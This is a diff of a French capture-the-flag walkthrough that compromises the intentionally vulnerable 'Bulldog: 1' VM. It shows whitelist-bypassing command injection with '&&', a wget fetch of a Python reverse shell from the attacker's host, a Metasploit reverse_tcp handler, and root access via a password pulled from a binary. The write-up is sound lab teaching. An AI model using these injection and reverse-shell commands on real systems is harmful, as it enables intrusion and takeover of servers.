@@ -1,6 +1,6 @@
 # Bulldog: 1
 
-[Bulldog: 1](https://www.vulnhub.com/entry/bulldog-1,211/) est une machine virtuelle vulnérable conçue par [le chercheur en sécurité Nick Frichette](https://frichetten.com/). L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. À l'heure où ces lignes sont écrites (février 2018), il s'agit de la seule VM de la série Bulldog, mais il semblerait que notre cher Nick [nous concocte un deuxième challenge](https://github.com/Frichetten/Bulldog-2-The-Reckoning) et cette fois-ci, en Node.js. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
+[Bulldog: 1](https://www.vulnhub.com/entry/bulldog-1,211/) est une machine virtuelle vulnérable, conçue par [le chercheur en sécurité Nick Frichette](https://frichetten.com/) et publiée sur VulnHub au mois d'août 2017. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. À l'heure où ces lignes sont écrites (février 2018), il s'agit de la seule VM de la série Bulldog, mais il semblerait que notre cher Nick [nous concocte un deuxième challenge](https://github.com/Frichetten/Bulldog-2-The-Reckoning) et cette fois-ci, en Node.js. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
 
 ## Synopsis
 
@@ -11,7 +11,7 @@ l'odieux gang des [bergers allemands](https://fr.wikipedia.org/wiki/Berger_allem
 
 L'adresse IP de la VM Bulldog nous est gracieusement fournie à l'écran d'ouverture de session : 192.168.56.102.
 
-Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi possible de se connecter à distance avec SSH au serveur Bulldog, mais sur un port non-standard : 23 au lieu de 22 ; deux serveurs Web WSGIServer 0.1 sont par ailleurs installés, respectivement sur les ports 80 et 8080 : sûrement les sites vitrines de _Bulldog Industries_.
+Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi possible de se connecter à distance avec SSH au serveur Bulldog, mais sur un port non-standard : 23 au lieu de 22 ; deux serveurs Web WSGIServer 0.1 sont par ailleurs installés, respectivement sur les ports 80 et 8080 : sûrement les sites vitrines de _Bulldog Industries_.
 
 ```console
 root@blinils:~# nmap -sT -sV -A 192.168.56.102
@@ -47,13 +47,13 @@ La page d'index est un [message à caractère informatif](https://www.youtube.co
 
 Un clic sur le lien vers la notice d'information, et on y apprend, de la plume du PDG Winston Churchy, que tout le personnel technique a été licencié en réponse à ce vol de données. _Nota Bene : le nom du PDG est plutôt bien trouvé car [Winston Churchill](https://fr.wikipedia.org/wiki/Winston_Churchill), le Premier ministre du Royaume-Uni durant la Seconde Guerre mondiale, fut surnommé par l'Union soviétique... [The British Bulldog](https://books.google.fr/books?id=WWMHAQAAQBAJ&pg=PA89&lpg=PA89)._
 
-Du briefing des équipes techniques, notre « ami sincère » ne semble en avoir retenu que des termes abscons : [_clam shell_](https://en.wiktionary.org/wiki/clamshell) au lieu de [_reverse shell_](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) et [_smelly_](https://en.wiktionary.org/wiki/smelly) [_cow_](https://en.wiktionary.org/wiki/cow) au lieu de la vulnérabilité [Dirty COW](https://dirtycow.ninja/). [Traduire les jeux de mots](https://traduirelesjeuxdemots.univ-lille3.fr/fr/) d'une langue à une autre s'avère singulièrement compliqué ; aussi, pour la version francophone, je propose que cette attaque soit l'oeuvre d'un groupuscule de cyberhackers à la solde d'un [géant pétrolier](https://fr.wikipedia.org/wiki/Shell_(entreprise)), et particulièrement friands de [La vache qui rit](https://fr.wikipedia.org/wiki/La_vache_qui_rit) !
+Du briefing des équipes techniques, notre « ami sincère » ne semble en avoir retenu que des termes abscons : [_clam shell_](https://en.wiktionary.org/wiki/clamshell) au lieu de [_reverse shell_](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) et [_smelly_](https://en.wiktionary.org/wiki/smelly) [_cow_](https://en.wiktionary.org/wiki/cow) au lieu de la vulnérabilité [_Dirty COW_](https://dirtycow.ninja/). [Traduire les jeux de mots](https://traduirelesjeuxdemots.univ-lille3.fr/fr/) d'une langue à une autre s'avère singulièrement compliqué ; aussi, pour la version francophone, je propose que cette attaque soit l'oeuvre d'un groupuscule de cyberhackers à la solde d'un [géant pétrolier](https://fr.wikipedia.org/wiki/Shell_(entreprise)), et particulièrement friands de [La vache qui rit](https://fr.wikipedia.org/wiki/La_vache_qui_rit) !
 
 ![Affichage de l'image MANUAL-pages.png](images/MANUAL-pages.png)
 
 ## Recherche automatique d'informations
 
-À présent, y a-t-il d'autres répertoires présents sur le site ? Pour le savoir, l'outil [DIRB](https://tools.kali.org/web-applications/dirb) va se servir d'une liste pré-établie de répertoires afin de déterminer l'arborescence du site. Il s'agit là d'une [attaque par dictionnaire](https://en.wikipedia.org/wiki/Password_cracking), a contrario d'une [attaque par bruteforce](https://en.wikipedia.org/wiki/Brute-force_attack) qui consisterait à tester, de manière exhaustive, toutes les combinaisons possibles : aa, ab, ac... zy zz aaa aab... zzy zzz aaaa aaab... et ainsi de suite. DIRB dispose d'un [large panel de dictionnaires](https://github.com/digination/dirbuster-ng/tree/master/wordlists), celui utilisé sera common.txt.
+À présent, y a-t-il d'autres répertoires présents sur le site ? Pour le savoir, l'outil [__DIRB__](https://tools.kali.org/web-applications/dirb) va se servir d'une liste pré-établie de répertoires afin de déterminer l'arborescence du site. Il s'agit là d'une [attaque par dictionnaire](https://en.wikipedia.org/wiki/Password_cracking), a contrario d'une [attaque par bruteforce](https://en.wikipedia.org/wiki/Brute-force_attack) qui consisterait à tester, de manière exhaustive, toutes les combinaisons possibles : aa, ab, ac... zy zz aaa aab... zzy zzz aaaa aaab... et ainsi de suite. DIRB dispose d'un [large panel de dictionnaires](https://github.com/digination/dirbuster-ng/tree/master/wordlists), celui utilisé sera common.txt.
 
 ```console
 root@blinils:~# dirb http://192.168.56.102 /usr/share/dirb/wordlists/common.txt
@@ -76,8 +76,8 @@ root@blinils:~# dirb http://192.168.56.102 /usr/share/dirb/wordlists/common.txt
 --snip--
 ```
 
-Deux nouveaux répertoires ont été trouvés par DIRB : _dev_ et _admin_. 
-La page /admin consiste en un formulaire de login vers le panel d'administration de [Django](https://www.djangoproject.com/), un framework Web développé en Python. Les injections SQL et les comptes par défaut (admin/admin django/django etc.) ayant fait chou blanc, il est temps de passer à l'autre page trouvée par DIRB. Je me permets de retranscrire ci-dessous le contenu de la page /dev car beaucoup d'indices ont été parsemés par Nick.
+Deux nouveaux répertoires ont été trouvés par __DIRB__ : ```dev``` et ```admin```. 
+La page ```/admin``` consiste en un formulaire de login vers le panel d'administration de [Django](https://www.djangoproject.com/), un framework Web développé en Python. Les injections SQL et les comptes par défaut (admin:admin, django:django, etc.) ayant fait chou blanc, il est temps de passer à l'autre page trouvée par DIRB. Je me permets de retranscrire ci-dessous le contenu de la page ```/dev``` car beaucoup d'indices ont été parsemés par Nick.
 
 tic tac tic tac... à vous de jouer, saurez-vous les retrouver en moins de deux minutes ? top chrono...
 
@@ -136,21 +136,20 @@ Database: sarah@bulldogindustries.com
 ... top ! À la lecture du texte ci-dessus, voici les informations que l'on peut supposer / en déduire.
 
 * Alan Brooke est le nouveau _Team Leader_, il faudra sans doute se focaliser sur son compte (peut-être est-il admin ?).
-* Dans un souci de transparence, Alan décrit le mode d'attaque de la _German Shepherd Hack Team_ : il s'agit à l'origine d'une vulnérabilité sur le serveur Web qui a conduit à l'obtention d'un shell sans privilèges (avec un compte Unix qui n'est pas root). L'exploit [Dirty COW](https://dirtycow.ninja/) a alors été utilisé pour obtenir les droits root. Il faudra probablement reproduire la même technique ou bien s'en inspirer pour arriver à nos fins.
-* Le site Web a subi un _[defacement](https://en.wikipedia.org/wiki/Website_defacement)_ à la suite de la compromission du serveur ; si les dégâts ne sont plus visibles dorénavant (en ce qui concerne les IHM ; car humainement, c'est une autre histoire...), il en reste néanmoins une trace dans le fichier robots.txt.
+* Dans un souci de transparence, Alan décrit le mode d'attaque de la _German Shepherd Hack Team_ : il s'agit à l'origine d'une vulnérabilité sur le serveur Web qui a conduit à l'obtention d'un shell sans privilèges (avec un compte Unix qui n'est pas root). L'exploit [_Dirty COW_](https://dirtycow.ninja/) a alors été utilisé pour obtenir les droits root. Il faudra probablement reproduire la même technique ou bien s'en inspirer pour arriver à nos fins.
+* Le site Web a subi un [_defacement_](https://en.wikipedia.org/wiki/Website_defacement) à la suite de la compromission du serveur ; si les dégâts ne sont plus visibles dorénavant (en ce qui concerne les IHM ; car humainement, c'est une autre histoire...), il en reste néanmoins une trace dans le fichier ```robots.txt```.
 * Bien que le serveur soit opérationnel, des opérations de maintenance sont toujours en cours pour basculer sur le nouveau système.
 * Il est précisé qu'à des fins pratiques, certains fichiers de l'ancien système corrompu sont toujours présents, et même parfois utilisés. Cette information vient renforcer notre hypothèse précédente : en effet, si des traces/fichiers/outils de l'attaque précédente ont été conservées, cela sera plus simple pour reproduire la technique employée par la _German Shepherd Hack Team_.
 * PHP n'est désormais plus le bienvenu sur le serveur, ce qui, a priori, signifie deux choses : que la vulnérabilité exploitée par la _German Shepherd Hack Team_ est sans doute liée à PHP (pourquoi s'en débarrasser sinon ?) et que l'on peut remiser nos [RCE](https://www.exploit-db.com/papers/12885/) et autres _reverse shells_ en PHP dans le placard du [LampSecurity CTF5](/CTF-VulnLabs/lampsecurity-CTF5). De plus, les attaquants ont certainement dû exploiter une vulnérabilité sur PHPMyAdmin, qui est cité dans la phrase suivante.
 * Le tout nouveau site Web de _Bulldog Industries_ utilise [Django](https://www.djangoproject.com/), un framework Web développé en Python.
-* L'accès en SSH est voué à disparaître, au profit d'un shell propriétaire /dev/shell/ nommé Web-Shell ; même si, pour le moment, les deux accès sont présents.
+* L'accès en SSH est voué à disparaître, au profit d'un shell propriétaire ```/dev/shell/``` nommé Web-Shell ; même si, pour le moment, les deux accès sont présents.
 * Le système de gestion de base de données MongoDB sera utilisé à terme, mais il n'est pas encore installé, ce qui explique pourquoi nmap n'a détecté que les services Web et SSH.
 * Un antivirus « révolutionnaire » est en cours d'implémentation sur le serveur, et est censé être exécuté chaque minute 
 (via une tâche sous [crontab](https://fr.wikipedia.org/wiki/Cron#crontab) ?).
 * Les adresses e-mail du nouveau staff sont désormais connues, et pourront être récoltées à des fins de [phishing](https://fr.wikipedia.org/wiki/Hame%C3%A7onnage).
 * Mieux encore, les prénoms de chaque membre du staff peuvent correspondre à des logins, très utiles pour se connecter en SSH ou au panel d'administration Django.
 
-L'accès à /dev/shell/ nous est interdit (« _Please authenticate with the server to use Web-Shell_ »), du moins tant que nous ne nous serons pas authentifiés.
-À force de tourner en rond, on finit par fouiller dans le code source HTML de chaque page et bingo, on tombe sur le jackpot : des hashs de mots de passe !
+L'accès à ```/dev/shell/``` nous est interdit (« _Please authenticate with the server to use Web-Shell_ »), du moins tant que nous ne nous serons pas authentifiés. À force de tourner en rond, on finit par fouiller dans le code source HTML de chaque page et bingo, on tombe sur le jackpot : des hashs de mots de passe !
 
 ![Affichage de l'image AUTO-hashsHTML.png](images/AUTO-hashsHTML.png)
 
@@ -227,7 +226,7 @@ update Web-Shell as soon as possible if a vulnerability is discovered.
 ifconfig ls echo pwd cat rm
 ```
 
-Miam, cela ressemble fortement à [de l'injection de commandes](https://www.owasp.org/index.php/Command_Injection), avec comme contrainte l'utilisation exclusive de programmes censés être inoffensifs, tels que _cat_ ou _ifconfig_. Après quelques essais, voici les données qui ont pu être exfiltrées malgré cette protection. 
+Miam, cela ressemble fortement à [de l'injection de commandes](https://www.owasp.org/index.php/Command_Injection), avec comme contrainte l'utilisation exclusive de programmes censés être inoffensifs, tels que ```cat``` ou ```ifconfig```. Après quelques essais, voici les données qui ont pu être exfiltrées malgré cette protection. 
 
 ```console
 Command : pwd
@@ -240,34 +239,13 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-syslog:x:104:108::/home/syslog:/bin/false
-_apt:x:105:65534::/nonexistent:/bin/false
-lxd:x:106:65534::/var/lib/lxd/:/bin/false
-messagebus:x:107:111::/var/run/dbus:/bin/false
-uuidd:x:108:112::/run/uuidd:/bin/false
-dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+--snip--
 bulldogadmin:x:1000:1000:bulldogadmin,,,:/home/bulldogadmin:/bin/bash
 django:x:1001:1001:,,,:/home/django:/bin/bash
 sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
 ```
 
-Preuve qu'une attaque par dictionnaire avec les logins trouvés dans le code source HTML (alan, william, malik...) aurait été inutile : le staff ne dispose pas de comptes nominatifs sur le serveur Unix. En revanche, trois comptes sont particulièrement intéressants car il est possible de s'y connecter en SSH : bulldogadmin, django et... root, bien sûr !
+Preuve qu'une attaque par dictionnaire avec les logins trouvés dans le code source HTML (alan, william, malik...) aurait été inutile : le staff ne dispose pas de comptes nominatifs sur le serveur Unix. En revanche, trois comptes sont particulièrement intéressants car il est possible de s'y connecter en SSH :```bulldogadmin```, ```django``` et... ```root```, bien sûr !
 
 ```console
 Command : ls -al
@@ -297,7 +275,7 @@ drwxrwxr-x 2 django django 4096 Sep 21 00:36 templates
 -rw-r--r-- 1 django django  595 Aug 16 23:55 wsgi.pyc
 ```
 
-Le but du jeu va consister à exécuter des commandes auxquelles nous n'avons normalement pas droit. Généralement, l'exploitation de cette vulnérabilité est réalisée à l'aide d'opérateurs logiques ([_control operators_](https://www.w3resource.com/linux-system-administration/control-operators.php) en anglais) : en effet, il est possible d'enchaîner plusieurs commandes à la suite, et la vérification n'est réalisée que sur le premier mot / que sur la première commande fournie. Ainsi, si le point-virgule est interdit, d'autres opérateurs logiques peuvent être utilisés afin de contourner les restrictions du Web-Shell.  
+Le but du jeu consiste à exécuter des commandes auxquelles nous n'avons normalement pas droit. Généralement, l'exploitation de cette vulnérabilité est réalisée à l'aide d'opérateurs logiques ([_control operators_](https://www.w3resource.com/linux-system-administration/control-operators.php) en anglais) : en effet, il est possible d'enchaîner plusieurs commandes à la suite, et la vérification semble n'être réalisée que sur le premier mot / que sur la première commande fournie. Ainsi, si le point-virgule est interdit, d'autres opérateurs logiques peuvent être utilisés afin de contourner les restrictions du Web-Shell.  
 
 ```console
 Command : id
@@ -341,7 +319,7 @@ Serving HTTP on 0.0.0.0 port 8000 ...
 
 ![Affichage de l'image WebShell-SimpleHTTPServer.png](images/WebShell-SimpleHTTPServer.png)
 
-De retour sur le Web-Shell, le reverse-shell Python est déposé sur le serveur via [wget](https://www.gnu.org/software/wget/).
+De retour sur le Web-Shell, le _reverse shell_ Python est déposé sur le serveur via [wget](https://www.gnu.org/software/wget/).
 
 ```console
 Command : ls && wget http://192.168.56.101:8000/shell.py
@@ -362,7 +340,7 @@ Un listener est alors mis en place sur notre machine, afin d'écouter toute conn
 root@blinils:~# service postgresql start
 root@blinils:~# msfdb start
 root@blinils:~# msfconsole
-                                                  
+
 --snip--
 msf > use exploit/multi/handler
 msf exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
@@ -376,7 +354,7 @@ msf exploit(multi/handler) > exploit -j
 [*] Started reverse TCP handler on 192.168.56.101:4444
 ```
 
-De retour une nouvelle fois sur le Web-Shell, le fait de lancer la commande _ls && python shell.py_ amorce la connexion.
+De retour une nouvelle fois sur le Web-Shell, le fait de lancer la commande ```ls && python shell.py``` amorce la connexion.
 
 ```console 
 msf exploit(multi/handler) > [*] Sending stage (50248 bytes) to 192.168.56.102
@@ -423,7 +401,7 @@ django@bulldog:/home/django/bulldog$
 
 ## Élévation de privilèges (root)
 
-Partons à la recherche de fichiers intéressants... le répertoire _.hiddenadmindirectory_ semble être une bonne piste.
+Partons à la recherche de fichiers intéressants... le répertoire ```.hiddenadmindirectory``` semble être une bonne piste.
 
 ```console
 django@bulldog:/home/django/bulldog$ cd /home/bulldogadmin
@@ -464,21 +442,21 @@ Let me know what you think of it!
 -Ashley
 ```
 
-C'est parfait, car nous sommes connectés en tant que django sur le serveur, et souhaitons obtenir un accès root. Il semblerait que ce _customPermissionApp_ soit notre sésame. Puisqu'il s'agit d'un prototype, voyons s'il est tout de même possible de contredire Ashley et de le reverser.
+C'est parfait, car nous sommes connectés en tant que ```django``` sur le serveur, et souhaitons obtenir un accès root. Il semblerait que ce ```customPermissionApp``` soit notre sésame. Puisqu'il s'agit d'un prototype, voyons s'il est tout de même possible de contredire Ashley et de le reverser.
 
 ```console
 django@bulldog:/home/bulldogadmin$ cd .hiddenadmindirectory
 cd .hiddenadmindirectory
 
 django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ file customPermissionApp
-<gadmin/.hiddenadmindirectory$ file customPermissionApp                      
+<gadmin/.hiddenadmindirectory$ file customPermissionApp
 customPermissionApp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c9f2333253302d74eff3da59653f82d28f9eb36f, not stripped
 
 django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ ./customPermissionApp
-<gadmin/.hiddenadmindirectory$ ./customPermissionApp                         
+<gadmin/.hiddenadmindirectory$ ./customPermissionApp
 bash: ./customPermissionApp: Permission denied
 
-<gadmin/.hiddenadmindirectory$ strings customPermissionApp                   
+<gadmin/.hiddenadmindirectory$ strings customPermissionApp
 --snip--
 GLIBC_2.4
 GLIBC_2.2.5
@@ -499,7 +477,7 @@ GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
 --snip--
 ```
 
-Nous y sommes presque ! [_strings_](https://en.wikipedia.org/wiki/Strings_(Unix)) laisse apparaître _sudo su root_ et le mot de passe _SUPERultimatePASSWORDyouCANTget_.
+Nous y sommes presque ! [```strings```](https://en.wikipedia.org/wiki/Strings_(Unix)) laisse apparaître ```sudo su root``` et le mot de passe ```SUPERultimatePASSWORDyouCANTget```.
 
 ```console
 django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ sudo su root
@@ -588,8 +566,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 '$pbkdf2-sha256$20000$dU7pfY8xBkCoVcrZm5Pyvg$AOBAk3cJttJtAGdjx4GrMOjO9h4ZUP0GgU4i16.I0lQ'
 ```
 
-On remarque bien que le hash n'a pas la même forme que ceux stockés en base de données et, même en opérant quelques modifications
-cosmétiques sur le hash ($pbkdf2-sha256 en pbkdf2_sha256 par exemple), cela ne marche toujours pas. Avec la bonne classe, c'est bien mieux.
+On remarque bien que le hash n'a pas la même forme que ceux stockés en base de données et, même en opérant quelques modifications cosmétiques sur le hash ($pbkdf2-sha256 en pbkdf2_sha256 par exemple), cela ne marche toujours pas. Avec la bonne classe, c'est bien mieux.
 
 ```console
 root@blinils:~# python
@@ -658,7 +635,7 @@ bulldog  db.sqlite3  db.sqlite3.old  manage.py	shell.py
 
 ![Affichage de l'image DJANGO-Admin1.png](images/DJANGO-Admin1.png)
 
-La connexion au compte _admin_ fonctionne désormais avec le nouveau mot de passe !
+La connexion au compte ```admin``` fonctionne désormais avec le nouveau mot de passe !
 
 ![Affichage de l'image DJANGO-Admin2.png](images/DJANGO-Admin2.png)
 
